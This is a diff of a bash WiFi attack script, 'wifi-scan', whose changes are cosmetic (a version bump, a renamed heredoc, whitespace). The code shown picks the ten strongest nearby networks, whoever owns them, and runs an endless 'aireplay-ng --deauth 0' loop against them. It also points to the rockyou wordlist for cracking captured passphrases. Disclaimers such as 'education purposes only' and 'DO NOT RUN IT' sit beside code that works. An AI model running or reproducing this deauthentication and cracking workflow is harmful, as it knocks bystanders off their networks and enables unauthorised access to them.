@@ -3,8 +3,8 @@
 # This script is for education purposes only and should not be executed.
 # Do NOT execute on public networks.
 
-# Helpful Commands
-# sudo lshw -C network # Get all details about the wifi interface
+ME=$(basename "${0}")
+VERSION="v0.02"
 
 RED=$(tput setaf 1) #'\033[31m'
 GREEN=$(tput setaf 2) #'\033[32m'
@@ -12,9 +12,6 @@ YELLOW=$(tput setaf 3) #'\033[33m'
 BLUE=$(tput setaf 14) #'\033[34m'
 GRAY=$(tput setaf 8) #'\033[90m'
 RESET=$(tput sgr0) #'\033[0m'
-
-ME=$(basename "${0}")
-VERSION="v0.01"
 
 INSTALL_FOLDER=~/apps
 WORDLIST_FOLDER=~/apps/aircrack-ng/wordlists
@@ -25,7 +22,7 @@ ROCKYOU_URL="https://github.com/zacheller/rockyou/blob/master/rockyou.txt.tar.gz
 AIRPORT_CMD="/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport"
 
 function _default() {
-  cat <<HEREDOC
+  cat <<DOCUMENTATION
 ${GREEN}wifi-scan${RESET}
 WiFi Scanner (${VERSION}). Use -h or --help param for help.
 ${GRAY}WARNING: DO NOT USE THIS PROGRAM! DO NOT RUN IT!${RESET}
@@ -45,7 +42,7 @@ ${YELLOW}SUBCOMMANDS:${RESET}
     ${GREEN}list      ${RESET}List all owned/discovered networks (get BSSID here).
     ${GREEN}crack     ${RESET}Crack passphrase after scan. Required param BSSID (e.g. "00:00:11:22:33:44")
 
-HEREDOC
+DOCUMENTATION
 
   if [[ "$(uname)" == "Linux" ]]; then
     _validate "airmon-ng besside-ng"
@@ -205,12 +202,12 @@ function _runMac() {
     # Get list of last 10 bssids (the ones with the highest signal)
     echo -e "[${BLUE}START${RESET}] Run deauth on the BSSIDs with the highest signal"
     bssids=$(printf '%s' "$wifis" | grep -o -E '([[:xdigit:]]{1,2}:){5}[[:xdigit:]]{1,2}' | tail -10)
-    
+
     # While sniffing still happening try doing deauth.
     while true; do
       for bssid in $bssids; do
         echo -e "${GRAY}[BSSID: $bssid]${RESET} Running deauth "
-        sudo aireplay-ng --deauth 0 -a "$bssid" $iface 
+        sudo aireplay-ng --deauth 0 -a "$bssid" $iface
         sleep 1
       done
       sleep 10
